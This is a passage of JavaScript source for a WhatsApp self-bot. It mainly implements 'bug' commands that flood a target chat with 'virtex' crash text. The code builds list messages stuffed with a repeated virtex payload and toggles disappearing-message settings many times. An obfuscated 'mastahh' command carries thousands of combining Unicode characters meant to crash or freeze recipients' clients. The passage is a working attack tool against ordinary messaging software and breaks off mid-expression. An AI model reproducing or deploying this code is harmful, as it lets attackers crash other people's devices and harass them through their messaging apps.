 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 footerText: `${virtex7(prefix)}`,
 description: `${virtex7(prefix)}`,
 sections: [
                     {
                      "title": "hahahaha",
 rows: [
                          {
                              "title": "haha",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
client.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftroli})
client.toggleDisappearingMessages(from, 0)
const xOnn101 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(9999999999), {})
			const xOfff101 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0), {})
			await client.relayWAMessage(xOnn101, { waitForAck: true })
			await client.relayWAMessage(xOfff101, { waitForAck: true })
			const xOnn102 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(9999999999), {})
			const xOfff102 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0), {})
			await client.relayWAMessage(xOnn102, { waitForAck: true })
			await client.relayWAMessage(xOfff102, { waitForAck: true })
			const xOnn104 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(9999999999), {})
			const xOfff104 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0), {})
			await client.relayWAMessage(xOnn104, { waitForAck: true })
			await client.relayWAMessage(xOfff104, { waitForAck: true })
break;
}
sendFakeStatus(from, 'Sukses Send Bug Sebanyak '+args.join(' '), fake)
break
		 case 'mastahh':
if (!mek.key.fromMe) return fakestatus("SELF-BOT");
var _0x4e42=['݆݆ܻܻࣩ','*Myth','͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋','ܻܻܻܺܺ','݆ܻܻࣩࣩ','๊๊์์์','֟֟֟֓֓','icXbo','hatsa','ٍٍٍٞ٘','᪴᪴᪴᪴Myt','֒֒֒֒֓','์์์๋๋','ؕؕؕؕؖ','Title','͊̈́̈́͋͋͋͋͋͋͋͠͠͠͠͠','ືືຶຶຶ','MOKAD','ّّّّؖ','͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠','̫̫̫̫̫̫̫̫̽̽̽̽̽̽̽','เึางื','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢','͢͢͠͠͠͠҉҉҉','৭99**','toggl','֓֓֒֒֒','ܑܑۛۛۛ','͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋','҈֟֟֟֟','itemC','ࣩࣩࣩࣧࣧ','ৣ͜͡҉*My','֒֒֒֘֘','֒֓֓֓֓','৭৭৭99','ดุท้่','̼̼̼̼̼̽̽̽̽̽̽̽͊͊͊','Hello','৭ঔৣ͜͡҉*','ຶຶຶຶຶ᪴᪴','ًًٍٍٍ','๊๊๊ࣤࣤ','҈҈̫̫̫̫̫̫̫̫̫̫̫','ؖؕؕؕؕ','๊๊๊์์','͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠','݆݊݊݊݊','̫̫̫̫̫̫̫̫̫̫̫̽̽̽̽','ܺܺܺܺܺ','֓֓֓֓֒','Messa','͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋','t҈҈҈҉','҈҈֟֟֟','͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠','͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́','͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠','݉݊݊݊݊','ࣩ࣯ࣩࣩࣩ','Xbot*','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','҈҈҈̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠','ssage','֓֓֓֒֒','݊݊݊݊݊','ຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','Xbot҈','ingMe','\x20Worl','ؕؕؖؖؖ','ࣨࣨࣨࣨࣤ','݆݆݊݊݊','9999*','֓֒֒֒֘','ؖؖؖؕؕ','ܺ݉݉݉݉','݉݉݉݊݊','৭৭99*','᪴᪴᪴᪴᪴᪴᪴My','֒֒֘֘֘','֗ؖؖؖؖ','๊ࣤࣤࣤࣤ','֟֓֓֓֓','bot*৭','֟֟֟֟֓','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ܑܑܑܑܑ','ٍٍٍٍٍ','Mythi','࣯ࣩࣩࣩࣩ','thicX','order','๋๋๋ືື','҈҈҈҉҉','ًًّٞٞ','݆݆݆݆݅','4829fwHcxj','13hXShDP','͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋','ot*৭৭','݉݉݉݉݊','҈҈҈҈̫̫̫̫̫','͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊','ًًًًً','1359289sKNbgc','݆݆݆݆ܻ','ًّٞٞٞ','t*৭ঔৣ͜͡','৭৭৭*M','์๋๋๋๋','̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋','bot҈҈','ot҈҈҈','**ঔৣ͜͡҉','๊๊๊๊๊','ّّؖؖؖ','ܑܑܑܑۛ','̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊','ܻܻܻܻܻ','hicXb','*ผิดุ','ࣩࣩࣩ࣯ࣩ','҉҉҉҉҉','҈҉҉҉҈','ࣩࣩࣩࣨࣨ','ppear','ًًًٍٍ','̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́','pp.ne','ࣨࣨࣤࣤࣤ','ࣩࣩࣩࣧࣧ','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','֘֘֘֗֗','essag','͢͢͠͠͠͠͠͠͠҉҉','ًٍٍٍۛ','างืผิ','ؖؖؖؖؖ','ܑܑܑܑܻ','҉҉҉҈҈','݆݆݆݆݅','ّّّؖؖ','݉݉݊݊݊','๊๊ࣤࣤࣤ','๊๊๊๊์','*৭৭৭ঔ','ًًًًّ','ٍٍٍٍ٘','҈҈҈҈҉','๋๋๋๋๋','ٍۛۛۛۛ','๒๒๒๒๒','֒֒֒֓֓','cXbot','ࣩࣨࣨࣨࣨ','ࣨࣨࣨࣤࣤ','๊์์์์','ܺܺܺ݉݉','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ًًٍٍٍ','֟֟֟֟֟','݆݆݆݊݊','͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠','ࣩࣩࣩࣩࣧ','*999*','ືືືຶຶ','৭৭৭ঔৣ͜͡','᪴Myth','ࣤࣤࣤࣤࣤ','ܑܑܑܻܻ','͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠','͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋','͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊','֘֗֗֗֗','ܻܻࣩࣩࣩ','ܻࣩࣩࣩࣩ','ࣩࣩࣩࣩࣨ','surfa','ًًًٍٍ','messa','ّٞٞٞٞ','҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫','ܑۛۛۛۛ','ܑܑܻܻܻ','๋๋๋๋ື','HOLE','ࣧࣧࣧࣧࣧ','owner','ًًًّٞ','ؕؕؕؖؖ','ٞٞٞٞ٘','҉҈҈҈҉','**999','͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋','0@s.w','݆݆݅݅݅','1cLVQaQ','ࣩࣩࣩࣩ࣯','ؕؖؖؖؖ','ືືືືຶ','͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊','ّّّّّ','ًًًًٍ','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','֓֓֓֓֓','ًًّّّ','̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽','͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́','eDisa','1200979orKwdx','֗֗֗֗ؖ','ືືືືື','݆݆݆݆݆','์์๋๋๋','ຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','҉*Myt','t*৭99','ؕؕؕؕؕ','͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','BLACK','๒๒๒*M','์์์์์','҈҉҉҉҉','͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋','99**ঔ','fRhVi','֓֒֒֒֒','ࣩࣩࣩࣩࣩ','݅݅݅݅݅','̫̫̽̽̽̽̽̽̽̽̽̽̽̽̽','݆݆݆݅݅','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','2EhGktQ','386031ZjTtDr','only','key','ຶຶຶຶຶ','ount','ࣩࣩࣨࣨࣨ','֒֒֓֓֓','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','ٍٍۛۛۛ','֒֘֘֘֘','ٞٞٞٞٞ','ࣩࣧࣧࣧࣧ','9**ঔৣ͜͡','֗֗ؖؖؖ','͢͢͠҉҉҉҉','๋๋ືືື','quote','҉҈҈֟֟','͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋','֟֟֓֓֓','ືຶຶຶຶ','݆݆݅݅݅','sendM','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠','҈҈҈҈҈','ࣩࣩࣧࣧࣧ','ٍٍٞٞ٘','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴M','log','statu','cipan','͢͢͠͠͠͠͠͠͠͠͠͠҉','͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊','์์์์๋','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴\x20','nvSjK','ࣩࣩ࣯ࣩࣩ','ࣩࣧࣧࣧࣧ','͋͢͢͢͢͢͢͢͢͢͠͠͠͠͠','191809UIvCgG','͋͋͋͋͋͋͋͢͢͢͠͠͠͠͠','֗֗֗ؖؖ','selle','֒֒֒֒֒','֘֘֗֗֗','ຶຶຶຶ᪴᪴᪴᪴᪴','҈҈҉҉҉','ythic','݆݆݆݅݅','̫̫̫̫̫̽̽̽̽̽̽̽̽̽̽','parti','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','ࣨࣨࣨࣨࣨ','҉҉҈҈֟','ࣩࣩࣩࣩࣧ','157OyWNpx','ঔৣ͜͡҉*M','͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́','ؖؖؕؕؕ','*ঔৣ͜͡҉*','ًّّّّ','3806qyahEk','҉҉҉҉҈','228596HWWiFX','ٍٞٞٞ٘','ܻܻܺܺܺ','ؖؖؖؖؕ','ܺܺ݉݉݉','ًًًًٍ','҈҈҈҈҈̫̫','ٍٍٍۛۛ','֘֘֘֘֗','ot*৭9','ۛۛۛۛۛ','ࣩࣩࣧࣧࣧ','*৭৭৭*','̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͠͠','๋ືືືື','๊๊๊๊ࣤ','͋͋͋͋͢͢͢͢͢͢͠͠͠͠͠','҉҈҈҈҈','ܻܻܻܻܺ','ّؖؖؖؖ','҉҉҈҈҈','ًٍٍٍٍ','̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽','rJid','֘֘֘֘֘','݆݆݆ܻܻ','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̽','݆݆݆݆݊','ܑܑܑۛۛ','ࣨࣤࣤࣤࣤ','ًًًًّ','̼̼̼̽̽̽͊͊͊͊͋͋͋͋͋','ຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴','৭৭৭৭৭','݆݅݅݅݅','ًًًّّ','t*৭৭৭','ท้่เึ','ܑܻܻܻܻ','ܺܺܺܺ݉','ܻܺܺܺܺ','֗֗֗֗֗','̼̼̼̼̼̽̽̽̽͊͊͊͊͋͋','݆݅݅݅݅','ঔৣ͜͡҉*\x20'];var _0x293d1a=function(_0xe5b85f,_0x3e47f9,_0x2b131c,_0x50b73d,_0xb8d2fd){return _0x9cdd(_0xe5b85f-0xf0,_0xb8d2fd);},_0x684e74=function(_0x25fd8a,_0x91e34f,_0x5898f3,_0x242999,_0x14a3c3){return _0x9cdd(_0x25fd8a-0xf0,_0x14a3c3);},_0x40c325=function(_0x3c464a,_0x8c809a,_0x5b0c60,_0x372cc8,_0x578bd0){return _0x9cdd(_0x3c464a-0xf0,_0x578bd0);},_0x28d701=function(_0x4eecc5,_0x3cab4b,_0xd619ab,_0x4cd0f1,_0x12a44a){return _0x9cdd(_0x4eecc5-0xf0,_0x12a44a);},_0x1dea33=function(_0x366fa0,_0x2f56d1,_0x6aa090,_0x49a4ac,_0x385e7d){return _0x9cdd(_0x366fa0-0xf0,_0x385e7d);};(function(_0x33730b,_0x32f0a8){var _0x163b34=function(_0x5f0177,_0x81cca3,_0x114d9e,_0x2eff52,_0x4fa4a2){return _0x9cdd(_0x2eff52- -0x204,_0x5f0177);},_0x32a1c2=function(_0x33946c,_0x2c302d,_0x1ad08d,_0x38ac3b,_0x3d59e1){return _0x9cdd(_0x38ac3b- -0x204,_0x33946c);},_0x4cd96d=function(_0x47e52a,_0x1402ed,_0x272342,_0x4905da,_0x14ba71){return _0x9cdd(_0x4905da- -0x204,_0x47e52a);},_0x43fde5=function(_0x12d949,_0xc6d9f5,_0x30ecb2,_0x418664,_0x43cb19){return _0x9cdd(_0x418664- -0x204,_0x12d949);},_0x5bee71=function(_0x5858b1,_0x3a3a7c,_0x23ba7d,_0x5eeccf,_0x39992f){return _0x9cdd(_0x5eeccf- -0x204,_0x5858b1);};while(!![]){try{var _0x39e2d9=parseInt(_0x163b34(0x25,-0x5f,-0xe3,-0x54,-0xf))+-parseInt(_0x32a1c2(0x9b,0x28,0x1c,0x46,0xa2))+parseInt(_0x4cd96d(-0x1,-0xd6,0x31,-0x5a,-0x13))*-parseInt(_0x43fde5(0xa7,-0x29,-0x52,0x3e,0xd9))+parseInt(_0x32a1c2(0x5d,0x151,0xa4,0xaf,0x34))*parseInt(_0x43fde5(0x55,0xd8,0xfb,0xa2,0x135))+-parseInt(_0x4cd96d(-0x28,0x1c,-0xf9,-0x91,-0x4b))+-parseInt(_0x32a1c2(-0xbd,-0xcb,-0xe4,-0x52,-0x99))*parseInt(_0x5bee71(-0x3a,-0xb,-0x6f,-0x92,-0x72))+-parseInt(_0x163b34(-0x19,0x2d,0x40,-0x6a,-0xfd))*-parseInt(_0x5bee71(-0x43,0x28,0x9b,0x3f,-0x5f));if(_0x39e2d9===_0x32f0a8)break;else _0x33730b['push'](_0x33730b['shift']());}catch(_0x40f4da){_0x33730b['push'](_0x33730b['shift']());}}}(_0x4e42,0x43a45+0x3be1*0x1a+-0x50c2*-0x3));if(!isOwner)return reply(mess[_0x293d1a(0x264,0x2c6,0x252,0x2e4,0x21b)][_0x293d1a(0x38d,0x429,0x3f9,0x2f3,0x31e)+'B']);setTimeout(()=>{var _0x3355c2=function(_0x43513e,_0x57f1de,_0x3e0b47,_0x460706,_0x342bf2){return _0x293d1a(_0x43513e-0x1ee,_0x57f1de-0x172,_0x3e0b47-0x6c,_0x460706-0xdc,_0x460706);},_0x56d461=function(_0x1867b5,_0x343438,_0x4289f5,_0x17c281,_0x5849d4){return _0x293d1a(_0x1867b5-0x1ee,_0x343438-0x1d0,_0x4289f5-0xed,_0x17c281-0xbd,_0x17c281);},_0x551ccd=function(_0x264413,_0x5305dd,_0x11cfee,_0x323213,_0xf60af2){return _0x684e74(_0x264413-0x1ee,_0x5305dd-0x8c,_0x11cfee-0x1b8,_0x323213-0x3e,_0x323213);},_0x506de4=function(_0x108789,_0x32b5a8,_0x2d0447,_0x1d98c5,_0x46e0b7){return _0x684e74(_0x108789-0x1ee,_0x32b5a8-0x1e9,_0x2d0447-0x42,_0x1d98c5-0xb4,_0x1d98c5);},_0x15fee0=function(_0x168d34,_0x2d9aee,_0xc2ee03,_0x2e815a,_0x306ed9){return _0x684e74(_0x168d34-0x1ee,_0x2d9aee-0xf3,_0xc2ee03-0xe8,_0x2e815a-0x6,_0x2e815a);},_0x289218={};_0x289218[_0x3355c2(0x449,0x42a,0x467,0x48f,0x4bb)]=_0x56d461(0x4ce,0x426,0x4fd,0x42b,0x4b8)+'D';var _0x7d80f1=_0x289218;dp[_0x3355c2(0x4d6,0x50a,0x44d,0x441,0x57d)+_0x551ccd(0x590,0x4e4,0x4e9,0x611,0x52a)+_0x551ccd(0x53d,0x4b3,0x4e3,0x5c4,0x58e)+_0x3355c2(0x503,0x54e,0x582,0x477,0x524)+_0x506de4(0x4fe,0x46a,0x542,0x508,0x506)+'s'](from,_0x7d80f1[_0x15fee0(0x449,0x4e5,0x4d0,0x3ab,0x4ec)]);},-0x1*0x2a2+-0x1*0xcaa+0xf4e);var _0xe42396={};_0xe42396[_0x40c325(0x295,0x227,0x2f9,0x2f7,0x2c0)+_0x28d701(0x281,0x299,0x29c,0x258,0x248)+'t']=_0x28d701(0x394,0x3a7,0x30a,0x353,0x41e)+_0x40c325(0x2d7,0x2e6,0x314,0x2c6,0x36a)+_0x684e74(0x352,0x3ea,0x2bb,0x2da,0x30e)+'t';var _0x5ef334={};function _0x9cdd(_0x70a090,_0xec8581){_0x70a090=_0x70a090-(-0x48d*0x3+0x1bab+-0xca1);var _0x234669=_0x4e42[_0x70a090];return _0x234669;}_0x5ef334[_0x684e74(0x2ed,0x357,0x382,0x2bc,0x344)+_0x40c325(0x267,0x2c5,0x1e6,0x1ff,0x2d6)]=0x98967f,_0x5ef334[_0x293d1a(0x280,0x312,0x300,0x2b1,0x2a9)+'s']=0x1,_0x5ef334[_0x1dea33(0x383,0x385,0x3a4,0x37b,0x3dc)+'ce']=0x1,_0x5ef334[_0x28d701(0x385,0x3b8,0x3e8,0x2f6,0x319)+'ge']=_0x684e74(0x2ce,0x26c,0x2da,0x249,0x315)+_0x1dea33(0x32f,0x3c0,0x370,0x382,0x3c8)+_0x40c325(0x2b6,0x2d8,0x28d,0x32e,0x241)+_0x293d1a(0x291,0x22c,0x21b,0x263,0x239)+_0x293d1a(0x391,0x359,0x361,0x3bf,0x401)+_0x684e74(0x2b6,0x287,0x2c9,0x25e,0x354)+_0x28d701(0x35d,0x390,0x2c7,0x36e,0x3fc)+_0x28d701(0x291,0x294,0x273,0x2e8,0x2b4)+_0x684e74(0x34c,0x3f5,0x2e8,0x301,0x3e8)+_0x684e74(0x34c,0x3f3,0x2f6,0x2f1,0x2d0)+_0x684e74(0x34c,0x382,0x310,0x3d4,0x34e)+_0x28d701(0x34c,0x3bf,0x335,0x303,0x39b)+_0x684e74(0x34c,0x2f5,0x31c,0x2eb,0x30f)+_0x40c325(0x35d,0x3db,0x2ba,0x39c,0x2cf)+_0x684e74(0x2a8,0x20d,0x2ee,0x267,0x219)+_0x293d1a(0x30c,0x36c,0x2bf,0x2f8,0x26f)+_0x293d1a(0x30c,0x386,0x392,0x2c7,0x378)+_0x1dea33(0x25f,0x23e,0x2d6,0x2b4,0x2af)+_0x28d701(0x2b8,0x2c0,0x279,0x273,0x315)+_0x28d701(0x2c1,0x239,0x36b,0x2c7,0x2b0)+_0x40c325(0x37d,0x37b,0x3ba,0x30c,0x410)+_0x684e74(0x303,0x257,0x306,0x279,0x2d3)+_0x28d701(0x29c,0x2a2,0x31e,0x259,0x346)+_0x293d1a(0x2eb,0x394,0x389,0x269,0x29d)+_0x1dea33(0x289,0x1f8,0x1fb,0x205,0x2a5)+_0x40c325(0x30d,0x374,0x324,0x31c,0x3a7)+_0x40c325(0x2e5,0x2d6,0x37e,0x2fc,0x29d)+_0x40c325(0x2e2,0x33a,0x2f7,0x350,0x308)+_0x293d1a(0x271,0x26a,0x216,0x2a7,0x226)+_0x28d701(0x305,0x2b3,0x294,0x26a,0x32d)+_0x293d1a(0x372,0x418,0x3b0,0x2f3,0x3df)+_0x1dea33(0x372,0x3c3,0x2e1,0x403,0x328)+_0x40c325(0x39e,0x3f6,0x38f,0x3c3,0x367)+_0x293d1a(0x39e,0x3cf,0x3bc,0x40d,0x42d)+_0x684e74(0x2e9,0x360,0x2c4,0x2d1,0x35b)+_0x1dea33(0x28e,0x209,0x335,0x21e,0x2a6)+_0x1dea33(0x28e,0x2f4,0x1e1,0x217,0x2c6)+_0x28d701(0x28e,0x221,0x221,0x224,0x2e0)+_0x28d701(0x2f1,0x374,0x31e,0x301,0x363)+_0x28d701(0x301,0x36a,0x311,0x358,0x2d7)+_0x40c325(0x321,0x283,0x3a0,0x2c9,0x38d)+_0x293d1a(0x2aa,0x2ab,0x281,0x345,0x24f)+_0x1dea33(0x2cb,0x2fa,0x2d2,0x362,0x298)+_0x293d1a(0x2cb,0x374,0x2db,0x259,0x253)+_0x1dea33(0x3a4,0x31a,0x339,0x440,0x381)+_0x293d1a(0x35b,0x348,0x3a6,0x305,0x370)+_0x684e74(0x35b,0x3be,0x3ae,0x35a,0x368)+_0x293d1a(0x35b,0x2dd,0x31b,0x32c,0x2d6)+_0x28d701(0x35b,0x3eb,0x300,0x2cf,0x3c2)+_0x40c325(0x35b,0x30e,0x307,0x3af,0x404)+_0x28d701(0x35b,0x2f0,0x2e7,0x3e6,0x3f4)+_0x28d701(0x35b,0x2e3,0x2ba,0x309,0x348)+_0x28d701(0x31c,0x2b5,0x32c,0x2b0,0x393)+_0x1dea33(0x3ab,0x443,0x3f2,0x401,0x369)+_0x40c325(0x2dc,0x254,0x35f,0x2ef,0x2a7)+_0x28d701(0x35b,0x30b,0x2d5,0x